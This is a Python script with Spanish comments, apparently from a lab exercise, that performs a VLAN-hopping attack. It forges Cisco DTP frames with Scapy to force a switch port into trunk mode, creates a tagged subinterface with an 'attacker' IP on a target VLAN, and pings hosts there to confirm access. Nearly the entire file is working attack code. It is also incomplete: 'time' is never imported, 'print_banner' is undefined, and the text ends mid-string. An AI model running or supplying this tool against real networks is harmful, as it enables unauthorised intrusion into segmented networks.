import argparse

import struct
import sys
import subprocess

try:
    from scapy.all import Ether, LLC, Raw, sendp, get_if_hwaddr
except ImportError:
    print("[!] Instala scapy: pip install scapy")

# ── Constantes ────────────────────────────────────────
DTP_MULTICAST = "01:00:0c:cc:cc:cc"
LLC_DSAP      = 0xaa
LLC_SSAP      = 0xaa
LLC_CTRL      = 0x03


def mac_str_to_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(':'))


def build_dtp_payload(src_mac_bytes: bytes) -> bytes:
    """
    Construye el payload SNAP + DTP manualmente como Raw bytes.
    Evita el problema del campo OUI en scapy.
    
    Estructura:
      SNAP: OUI(3) + Type(2)
      DTP header: version(1)
      TLV 0x0001 — Versión DTP
      TLV 0x0002 — Status (desirable)
      TLV 0x0003 — Tipo trunk (802.1Q)
      TLV 0x0004 — Neighbor MAC
    """
    # SNAP header manual: OUI Cisco (00:00:0c) + Type DTP (20:04)
    snap = b'\x00\x00\x0c\x20\x04'

    # DTP version
    dtp_header = bytes([0x01])

    # TLV 1: Version
    tlv1 = struct.pack('>HH', 0x0001, 0x0005) + bytes([0x01])

    # TLV 2: Status desirable (0x01 = solicitar trunk)
    tlv2 = struct.pack('>HH', 0x0002, 0x0005) + bytes([0x01])

    # TLV 3: Tipo trunk 802.1Q (0xa5)
    tlv3 = struct.pack('>HH', 0x0003, 0x0005) + bytes([0xa5])

    # TLV 4: Neighbor MAC (largo = 4 + 6 = 10)
    tlv4 = struct.pack('>HH', 0x0004, 0x000a) + src_mac_bytes

    return snap + dtp_header + tlv1 + tlv2 + tlv3 + tlv4


def negotiate_trunk(iface: str, count: int, interval: float):
    print(f"\n{'='*52}")
    print(f"  FASE 1 — Negociación DTP (trunk)")
    print(f"{'='*52}")

    src_mac     = get_if_hwaddr(iface)
    src_mac_b   = mac_str_to_bytes(src_mac)
    payload     = build_dtp_payload(src_mac_b)

    # LLC + Raw (SNAP+DTP como bytes planos)
    pkt = (
        Ether(dst=DTP_MULTICAST, src=src_mac) /
        LLC(dsap=LLC_DSAP, ssap=LLC_SSAP, ctrl=LLC_CTRL) /
        Raw(load=payload)
    )

    print(f"  [*] Interfaz  : {iface}")
    print(f"  [*] MAC origen: {src_mac}")
    print(f"  [*] Destino   : {DTP_MULTICAST}")
    print(f"  [*] Paquetes  : {count} cada {interval}s\n")

    for i in range(1, count + 1):
        sendp(pkt, iface=iface, verbose=False)
        bar = '█' * i + '░' * (count - i)
        print(f"\r  [{bar}] {i}/{count} paquetes DTP enviados", end='', flush=True)
        if i < count:
            time.sleep(interval)

    print(f"\n\n  [✓] Negociación DTP completada.")
    print(f"\n  Verifica en el switch:")
    print(f"    SW-Core# show interfaces trunk")
    print(f"    SW-Core# show interfaces Gi0/2 switchport")


def create_vlan_subinterface(iface: str, vlan_id: int, attacker_ip: str):
    print(f"\n{'='*52}")
    print(f"  FASE 2 — VLAN Hopping → VLAN {vlan_id}")
    print(f"{'='*52}")

    sub = f"{iface}.{vlan_id}"

    # Limpiar si existía
    subprocess.run(["ip", "link", "delete", sub], capture_output=True)

    cmds = [
        ["ip", "link", "add", "link", iface, "name", sub, "type", "vlan", "id", str(vlan_id)],
        ["ip", "link", "set", sub, "up"],
        ["ip", "addr", "add", f"{attacker_ip}/24", "dev", sub],
    ]
    for cmd in cmds:
        r = subprocess.run(cmd, capture_output=True)
        if r.returncode != 0:
            print(f"  [!] {' '.join(cmd)}: {r.stderr.decode().strip()}")

    print(f"  [✓] Subinterfaz {sub} creada → IP {attacker_ip}/24")


def verify_access(ips: list):
    print(f"\n{'='*52}")
    print(f"  FASE 3 — Verificación de acceso")
    print(f"{'='*52}")
    for ip in ips:
        r = subprocess.run(["ping", "-c", "2", "-W", "1", ip], capture_output=True)
        status = "[✓] ACCESIBLE" if r.returncode == 0 else "[✗] Sin respuesta"
        print(f"  {status}  →  {ip}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--iface',       required=True)
    parser.add_argument('--target-vlan',       type=int,   default=10)
    parser.add_argument('--attacker-ip',       default='10.11.85.200')
    parser.add_argument('--count',             type=int,   default=5)
    parser.add_argument('--interval',          type=float, default=1.0)
    parser.add_argument('--verify-ips',        nargs='+',
                        default=['10.11.85.10','10.11.85.11',
                                 '10.11.85.12','10.11.85.13'])
    parser.add_argument('--skip-hop',          action='store_true')
    parser.add_argument('--cleanup',           action='store_true')
    args = parser.parse_args()

    print_banner()

    # Fase 1
    negotiate_trunk(args.iface, args.count, args.interval)

    time.sleep(3)

    # Fase 2
    create_vlan_subinterface(args.iface, args.target_vlan, args.attacker_ip)

    # Fase 3
    verify_access(args.verify_ips)

    if args.cleanup:
        subprocess.run(["ip", "link", "delete", f"{args.iface}.{args.target_vlan}"],
                       capture_output=True)
        print(f"\n  [i] Subinterfaz eliminada.")

    print(f"""
